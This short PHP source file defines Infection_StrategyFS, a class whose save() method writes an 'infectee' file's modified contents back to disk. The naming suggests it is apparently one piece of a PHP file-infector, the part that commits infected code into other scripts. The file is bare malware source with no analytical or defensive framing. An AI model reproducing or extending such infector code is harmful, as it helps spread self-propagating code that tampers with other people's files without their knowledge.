<?php

class Infection_StrategyFS extends Infection_Strategy
{
	function save()
	{
		if(!is_integer(file_put_contents($this -> infectee -> getpathname(), $this -> infectee -> text(), LOCK_EX)))
		{
			throw new LogicException('Saving through FS failed');
		}
	}
}

?>